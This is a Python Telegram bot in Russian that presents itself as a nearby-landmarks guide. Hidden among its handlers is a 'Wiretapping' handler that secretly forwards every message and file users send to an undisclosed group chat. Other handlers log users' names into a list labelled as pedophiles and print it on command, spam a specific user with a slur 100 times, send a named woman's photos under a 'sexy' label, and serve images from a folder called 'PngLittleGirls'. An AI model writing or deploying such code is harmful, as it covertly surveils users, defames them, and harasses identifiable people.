import random
import time
import telebot
from telebot import types
from math import radians, sin, cos, sqrt, atan2
from beta.data import config, landmarks, SmartSaving
from beta.funcs import getsmartinfo
import os


bot = config.bot
geolocator = config.geolocator


shaluni = []
pedofiles = []
# Admin functions
@bot.message_handler(commands=['check', 'status'])
def check(message):
    print('Message chat id: ', message.chat.id)
    SmartSaving.SmartSaving(str(message.chat.id));
    bot.reply_to(message, text=f'Bot status: working, {message.from_user.username}!')
    chatid = message.chat.id
    print(message)


@bot.message_handler(commands=['stop'])
def stop(message):
    if message.from_user.username == "netl01":
        bot.reply_to(message, text=f"Bot stopped.")
        crashlist = [1, 2, 3]
        for i in range(len(crashlist) + 10):
            a = crashlist[i]
    else:
        bot.reply_to(message, text=f'Permission deny.')



# /start FUNCTIONS // ONLY LOCAL MESSAGES

class State:
    WAITING_FOR_LOCATION = 0
    WAITING_FOR_FEEDBACK = 1

state = State.WAITING_FOR_LOCATION

sorted_landmarks = []
current_landmark_index = 0

@bot.message_handler(commands=["start"])
def start(message):
    if message.chat.type == 'private':
        bot.send_message(-4031826999, text=f'Пользователь @{message.from_user.username} начал взаимодействие /start')
        keyboard = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_geo = telebot.types.KeyboardButton(text="Отправить местоположение", request_location=True)
        keyboard.add(button_geo)
        bot.send_message(message.chat.id, "Поделись местоположением", reply_markup=keyboard)
    else:
        bot.send_message(message.chat.id, text='Работает только в локальном чате.')

def takeinfo(m):
    name, desc, link, img, exc = getsmartinfo.takesmartinfo(sorted_landmarks[current_landmark_index]["name"])
    if exc == None:
        print(sorted_landmarks[current_landmark_index])
        bot.send_photo(m, link)
        if len(desc) > 100:
            short_desc = desc[:100] + "..."
            keyboard = types.InlineKeyboardMarkup()
            button_full = types.InlineKeyboardButton(text="Читать полностью", callback_data=f"full_desc_{current_landmark_index}")
            keyboard.add(button_full)
            bot.send_message(m, text=f"{short_desc}", reply_markup=keyboard)
            # bot.send_message(m, text=f'Найдена полная статья на Wikipedia: {link}')
        else:
            bot.send_message(m, text=f"{desc}")

    else:
        bot.send_message(m, text=f'Exception: {exc}')

@bot.callback_query_handler(func=lambda call: call.data.startswith("full_desc_"))
def full_desc_handler(call):
    index = int(call.data.split("_")[2])
    name, desc, link, img, exc = getsmartinfo.takesmartinfo(sorted_landmarks[index]["name"])
    if exc == None:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{desc} \n\n\n Найдена полная статья на Wikipedia: {link}")
    else:
        bot.send_message(call.message.chat.id, text=f'Exception: {exc}')


@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location is not None:
        # Store latitude and longitude in variables
        latitude = message.location.latitude
        longitude = message.location.longitude

        # Calculate distance to landmarks
        global sorted_landmarks
        global current_landmark_index
        distances = []
        for landmark in landmarks.landmarks:
            location = config.geolocator.geocode(landmark["address"])
            landmark_latitude = location.latitude
            landmark_longitude = location.longitude
            d = distance(latitude, longitude, landmark_latitude, landmark_longitude)
            distances.append({"name": landmark["name"], "address": landmark["address"], "distance": d})
        sorted_landmarks = sorted(distances, key=lambda x: x["distance"])
        current_landmark_index = 0

        # Send message to user
        global state
        state = State.WAITING_FOR_FEEDBACK
        send_landmark_message(message.chat.id)

def send_landmark_message(chat_id):
    global sorted_landmarks
    global current_landmark_index
    landmark = sorted_landmarks[current_landmark_index]
    bot.send_message(chat_id, f"{landmark['distance']:.2f} км от Вас:  {landmark['name']} "
                              f"По адресу: {landmark['address']}. Нравится?", reply_markup=get_feedback_keyboard())

def get_feedback_keyboard():
    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    button_yes = telebot.types.KeyboardButton(text="Иду")

    button_next = telebot.types.KeyboardButton(text="Далее")
    button_stop = telebot.types.KeyboardButton(text="Остановить поиск")
    keyboard.add(button_yes, button_next, button_stop)
    return keyboard



def gotoSikerina(message):
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    username = "@" + message.from_user.username
    print(username, last_name, first_name)
    pedofiles.append(str(f'{username}, {first_name}, {last_name}'))
    time.sleep(1)
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="Давайте!", callback_data="send_photo")
    markup.add(button)
    bot.send_message(message.chat.id, text="Постойте, нашли ещё кое-что для вас!", reply_markup=markup)
    print(shaluni)
    #if message.chat.id in shaluni:
        #bot.send_message(message, text=f'Вы уже помечены как заядлы розбiйник дрочуне')
    #else:
        #shaluni.append(str(message.chat.id))

def sexySikerina(message):
    time.sleep(1)
    photo = open('C:/Users/razuv/PycharmProjects/HistoryBotProject_v1/BadSikerina.jpg', 'rb')
    bot.send_photo(message.chat.id, photo)

@bot.message_handler(commands=["shalunlist"])
def ListShaluny(message):
    bot.send_message(message.chat.id, text="Среди педофилов успели засветиться: ")
    if len(pedofiles) == 0:
        bot.send_message(message.chat.id, text='Список pedofiles is empty')
    else:
        for i in range(len(pedofiles)):
            bot.send_message(message.chat.id, text=f'{i+1}.) {pedofiles[i]}')


@bot.callback_query_handler(func=lambda call: call.data == "send_photo")
def send_photo_callback(call):
    print(shaluni, "1")
    print(str(call.message.chat.id) in shaluni)
    if str(call.message.chat.id) in shaluni:
        bot.send_message(call.message.chat.id, text=f'Вы уже помечены как заядлы розбiйник дрочуне')
        sexySikerina(call.message)
        print('1')

    else:
        print('2')
        shaluni.append(str(call.message.chat.id))

        bot.send_message(call.message.chat.id, text='Виктория Сикерина в 2 метрах от вас!')
        photo = open('C:/Users/razuv/PycharmProjects/HistoryBotProject_v1/sikerina.jpg', 'rb')
        bot.send_photo(call.message.chat.id, photo)


@bot.message_handler(func=lambda message: state == State.WAITING_FOR_FEEDBACK)
def handle_feedback(message):
    global state
    if message.text == "Иду":
        takeinfo(message.chat.id)
    elif message.text == "No":
        bot.send_message(message.chat.id, "pass", reply_markup=get_next_keyboard())
        state = State.WAITING_FOR_FEEDBACK
    elif message.text == "Далее":
        global current_landmark_index
        current_landmark_index += 1
        if current_landmark_index < len(sorted_landmarks):
            send_landmark_message(message.chat.id)
            state = State.WAITING_FOR_FEEDBACK
        else:
            bot.send_message(message.chat.id, "Вы просмотрели все места в вашем радиусе.", reply_markup=types.ReplyKeyboardRemove(), parse_mode='Markdown')
            state = State.WAITING_FOR_LOCATION
            gotoSikerina(message)
    elif message.text == "Остановить поиск":
        bot.send_message(message.chat.id, "Поиск прекращён.", reply_markup=types.ReplyKeyboardRemove(), parse_mode='Markdown')
        state = State.WAITING_FOR_LOCATION

def get_next_keyboard():
    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    button_next = telebot.types.KeyboardButton(text="Next")
    button_stop = telebot.types.KeyboardButton(text="Stop")
    keyboard.add(button_next, button_stop)
    return keyboard

def distance(lat1, lon1, lat2, lon2):
    R = 6371  # Radius of the earth in km
    dLat = radians(lat2 - lat1)
    dLon = radians(lon2 - lon1)
    a = sin(dLat / 2) * sin(dLat / 2) + cos(radians(lat1)) * cos(radians(lat2)) * sin(dLon / 2) * sin(dLon / 2)
    c = 2 * atan2(sqrt(a), sqrt(1 - a))
    distance = R * c  # Distance in km
    return distance


# /start METHODS ENDED




@bot.message_handler(commands=["Dima_Borisov_DDOS"])
def DimaBorisovDDOS(message):
    for i in range(100):
        time.sleep(0.5)
        bot.send_message(chat_id=953910033, text='привет пидрила')



# DIMA'S IDIOTS FUN METHODS
@bot.message_handler(content_types=["voice", "sticker", "video", "document", "photo", "text"])
def Wiretapping(message):
    bot.forward_message(chat_id=-4031826999, from_chat_id=message.chat.id, message_id=message.id)
    # bot.send_message(message, text='/start - поиск ближайших культурных мест.')


@bot.message_handler(commands=["picture"])
def AnimeGirlsInjector(message):
    #text = str(message.text.split("/check")[1::])
    #image = AnimeGirlsWrapper.GetAnimeLittleGirl(text)
    #if image == None:
    #    bot.reply_to(message, text='No images found for the query')
    #else:
    #    bot.send_photo(message, image)
    files = os.listdir('sourse/ANIMEPACK/PngLittleGirls')
    filename = str(random.randint(1, 200))
    photo = open('sourse/ANIMEPACK/PngLittleGirls/' + filename + '.png', 'rb')
    bot.send_photo(message.chat.id, photo)































bot.polling(none_stop=True, interval=0)